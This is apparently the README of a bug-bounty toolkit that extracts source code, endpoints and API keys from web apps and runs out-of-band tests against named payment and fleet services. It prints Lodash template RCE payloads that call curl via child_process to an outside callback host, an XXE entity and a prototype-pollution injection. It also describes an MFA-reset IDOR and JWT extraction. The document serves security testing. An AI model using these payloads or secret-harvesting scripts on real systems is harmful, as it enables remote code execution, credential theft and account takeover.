# Source Extraction & Security Testing Tools

Comprehensive toolkit for intelligent source code extraction and security vulnerability testing.

## Quick Start

### 1. Universal Auto-Detecting Extractor (Recommended)

**File:** `source-extractor-auto.js`  
**Location:** Use in DevTools Console (F12 → Console)  
**Target:** Any web application

```javascript
// Copy entire content of source-extractor-auto.js
// Paste in Chrome DevTools Console on target site
// Press Enter
```

**What it does:**
- Automatically detects if source maps (.js.map) are available
- If YES → Extracts full original source tree, normalizes paths, downloads ZIP
- If NO → Auto-switches to endpoint/secret extraction from bundled JS
- Always exports JSON with findings (API endpoints, keys, configs, emails, IPs, routes)

**Output:**
- `{hostname}-extraction-SOURCE_MAPS.zip` (if source maps found)
- `{hostname}-extraction-SOURCE_MAPS.json` OR `{hostname}-extraction-ENDPOINT_EXTRACTION.json`

**Example:** Testing PayCools (merchant.paycools.com.ph)
```
[UniversalExtractor] Starting universal extraction...
[UniversalExtractor] Found 8 script(s)
[UniversalExtractor] Scanning for source maps... 0 found
[UniversalExtractor] Switching to ENDPOINT_EXTRACTION mode
[UniversalExtractor] Extracting endpoints, APIs, keys...
[UniversalExtractor] Results: 45 endpoints, 12 keys, 8 configs found
[UniversalExtractor] Exporting JSON...
```

---

## Individual Tools

### 2. Source Map Extractor (DevTools)

**File:** `source-extractor.js`  
**Usage:** Paste in DevTools Console  
**When to use:** When source maps (.js.map) are available  

**Output:**
- `{hostname}-source-complete.zip` - Full reconstructed source tree

### 3. Source Map Extractor (Node.js CLI)

**File:** `source-extractor-node.js`  
**Usage:** 
```bash
node source-extractor-node.js https://target.com --headers="Authorization: Bearer TOKEN"
```

**Options:**
- `--map-url <url>` - Extract specific map file
- `-H, --headers <header>` - Custom headers (e.g., Authorization)
- `--timeout <ms>` - Request timeout (default 30000)
- `--include-node-modules` - Include node_modules in extraction

### 4. Endpoint & Secret Extractor

**File:** `js-endpoint-extractor.js`  
**Usage:** Paste in DevTools Console  
**When to use:** Apps without source maps (production builds)

**Extracts:**
- API endpoints: `/api/*`, `/v1/*`, `/auth/*`, `/merchant/*`, `/payment/*`, `/admin/*`, etc.
- API Keys: Google, Stripe, OpenAI, GitHub, GitLab, AWS, Slack tokens
- Firebase configs, AWS references, S3 buckets
- Email addresses, internal IPs
- Vue/React routes, GraphQL operations
- WebSocket URLs

**Output:**
- `{hostname}-endpoints.json` - All discovered endpoints and secrets
- Console table for immediate review

---

## Security Testing Tools

### 5. PayCools OOB Testing Harness

**File:** `oob-paycools-tests.sh`  
**Target:** PayCools (merchant.paycools.com.ph, api.paycools.com.ph)  
**OOB Domain:** testrce.6u.gg (configure your own if needed)

**Usage:**
```bash
./oob-paycools-tests.sh
# Or with custom credentials:
TOKEN="your-jwt-token" FLEET_ID="your-fleet-id" ./oob-paycools-tests.sh
```

**Tests included:**
1. **SSTI/RCE** - Lodash _.template() prototype pollution
2. **XXE** - XML External Entity via file upload
3. **SSRF** - Server-Side Request Forgery via webhook/callback URLs
4. **SQLi** - Time-based blind SQL injection on search/filter endpoints
5. **MFA IDOR** - Arbitrary user MFA bypass via /auth/resetMFA endpoint
6. **NoSQL** - MongoDB injection patterns (if backend uses MongoDB)

**Real endpoints tested:**
- `/auth/login`, `/auth/logout`, `/auth/resetMFA`, `/auth/changeMfaStatus`
- `/auth/diffDevice`, `/auth/deviceAuthCode`, `/auth/forget/resetPwd`
- `/merchant/async/download/task/list`, `/detail/payin/linkTrans`
- `/api/financialManage`, `/api/transition`, `/api/onlinePayment`, etc.

**Monitor for callbacks:** Check your testrce.6u.gg dashboard for hits

### 6. WebSocket SSTI Testing

**File:** `ws-ssti-test.js`  
**Target:** PriceLocQ WebSocket endpoint  
**Usage:**
```bash
node ws-ssti-test.js <JWT_TOKEN> <FLEET_ID>
```

**What it tests:**
- Lodash _.template() SSTI via connectionId
- SSTI via report name, type, fleetId fields
- Prototype pollution variants
- Function-escape SSTI patterns

### 7. PriceLocQ OOB Testing Harness

**File:** `oob-rce-tests.sh`  
**Target:** PriceLocQ (api.locq.com)  
**OOB Domain:** testrce.6u.gg

**Tests:**
- Report generation SSTI (Lodash _.template())
- Driver batch import XXE
- SSRF via avatar/webhook/cashin redirect URLs
- Blind SQLi on drivers, fuel codes, users, vehicles
- WebSocket SSTI
- CRLF injection

---

## Workflow Example: PayCools Bug Bounty

### Step 1: Source Extraction
```javascript
// Open merchant.paycools.com.ph in browser
// F12 → Console → Paste source-extractor-auto.js → Enter
// Downloads JSON with endpoints + keys
```

### Step 2: API Enumeration
```bash
# Extract revealed endpoints from JSON
cat merchant-paycools-com-ph-extraction-ENDPOINT_EXTRACTION.json | jq '.endpoints'
```

### Step 3: OOB Testing
```bash
# Set up testrce.6u.gg OOB listener
# Run test harness with extracted endpoints
JWT_TOKEN="your-token" FLEET_ID="your-fleet" ./oob-paycools-tests.sh

# Monitor testrce.6u.gg for callbacks
# Callbacks = confirmed vulnerability
```

### Step 4: Root Cause & Impact
- Callbacks on `/rce-*` = Remote Code Execution (P1)
- Callbacks on `/xxe-*` = XML External Entity (P1-P2)
- Callbacks on `/ssrf-*` = Server-Side Request Forgery (P2)
- Callbacks on `/sqli-*` = SQL Injection (P1)
- MFA IDOR = Authentication Bypass (P1)

---

## Key Vulnerabilities Being Tested

### 1. Lodash _.template() SSTI/RCE
PriceLocQ and PayCools use Lodash template engine for report generation.  
If user input reaches `_.template()` unsanitized = Remote Code Execution

**Payloads:**
```
${require('child_process').exec('curl http://oob-domain/callback')}
<%= global.process.mainModule.require('child_process').execSync('cmd') %>
__proto__: { sourceURL: "\nreturn require('child_process').exec('curl http://...')\n" }
```

### 2. XML External Entity (XXE)
File upload endpoints accepting XLSX/XML formats  
If external entities not disabled = Blind data exfiltration

**Payloads:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://oob-domain/xxe-callback">
]>
```

### 3. Server-Side Request Forgery (SSRF)
Avatar URLs, webhook configs, redirect parameters  
If not validated = Can reach internal services, metadata endpoints

### 4. Prototype Pollution + _.template()
JavaScript object pollution combined with template injection  
`__proto__.sourceURL` can inject code into template compilation context

### 5. Time-Based Blind SQLi
Search/filter endpoints likely hit a database  
SLEEP(5) + HTTP timing = Blind SQL injection detection

### 6. MFA Bypass via IDOR
`/auth/resetMFA` may accept arbitrary userId  
If not properly authorized = MFA bypass on any account

---

## Configuration

### OOB Domain Setup
Default: `testrce.6u.gg`  
Create your own at Burp Collaborator, Canary Tokens, or 6u.gg

### Custom Headers
For authenticated targets, extract JWT from browser localStorage:
```javascript
// DevTools Console
localStorage.getItem('accessToken')  // Copy the value
```

Then pass to scripts:
```bash
TOKEN="your-jwt" ./oob-paycools-tests.sh
```

---

## Files Overview

| File | Type | Purpose | Usage |
|------|------|---------|-------|
| source-extractor-auto.js | DevTools | Universal auto-detecting extractor | Paste in Console |
| source-extractor.js | DevTools | Source map extraction only | Paste in Console |
| source-extractor-node.js | Node.js CLI | Automated source extraction | `node source-extractor-node.js <url>` |
| js-endpoint-extractor.js | DevTools | Endpoint extraction (no maps) | Paste in Console |
| oob-paycools-tests.sh | Bash | PayCools vulnerability testing | `./oob-paycools-tests.sh` |
| oob-rce-tests.sh | Bash | PriceLocQ vulnerability testing | `./oob-rce-tests.sh` |
| ws-ssti-test.js | Node.js | WebSocket SSTI automation | `node ws-ssti-test.js <token> <fleet-id>` |

---

## Security Considerations

⚠️ **Authorization Required**
- Only use on targets you have explicit permission to test
- Verify bugcrowd/hackerone/yeswehack authorization before testing
- Never test without scope agreement

⚠️ **OOB Domain**
- Use a personal OOB domain (6u.gg, Burp Collaborator, etc.)
- Ensures callbacks are logged securely
- Don't use shared public domains

⚠️ **Rate Limiting**
- Tests include 500ms delays between requests
- Add longer delays if target implements aggressive throttling
- Some time-based SQLi tests may take 10+ seconds per request

---

## Troubleshooting

### Source extractor returns 0 scripts
```
[UniversalExtractor] Found 0 script(s)
```
**Solution:** Wait for page to fully load, scripts may be injected via script tags after page load

### HTTPS certificate errors
```
CERTIFICATE_VERIFY_FAILED
```
**Solution:** Disable SSL verification (use `-k` in curl) or add trusted CA to system

### OOB callbacks not received
```
=== Done. Check testrce.6u.gg for callbacks ===
```
**Solutions:**
1. Verify testrce.6u.gg is configured and monitoring
2. Check if target blocks outbound HTTP (may require HTTPS OOB)
3. Verify payload syntax in error response from API
4. Test OOB domain manually: `curl -v http://testrce.6u.gg/test-connectivity`

### Token/Auth errors
```
HTTP 401 Unauthorized
```
**Solutions:**
1. Extract fresh JWT from target: `localStorage.getItem('accessToken')`
2. Verify token not expired: check browser DevTools Network tab
3. Some endpoints may not require auth - test without Authorization header

---

## Next Steps

1. **Extract** - Run source-extractor-auto.js on target
2. **Enumerate** - Review extracted endpoints and test connectivity
3. **Test** - Run OOB harness to probe for vulnerabilities
4. **Verify** - Check OOB domain for callbacks
5. **Root Cause** - Analyze vulnerable code for impact
6. **Report** - Document in Bugcrowd/HackerOne format with PoC

---

## References

- Lodash template injection: https://codeql.github.io/codeql-query-help/javascript/js-template-object-injection/
- XXE payloads: https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Processing
- Prototype pollution: https://portswigger.net/research/prototype-pollution-the-silent-guardian-of-javascript
- SQLi blind testing: https://portswigger.net/web-security/sql-injection/blind
- SSRF: https://portswigger.net/web-security/ssrf

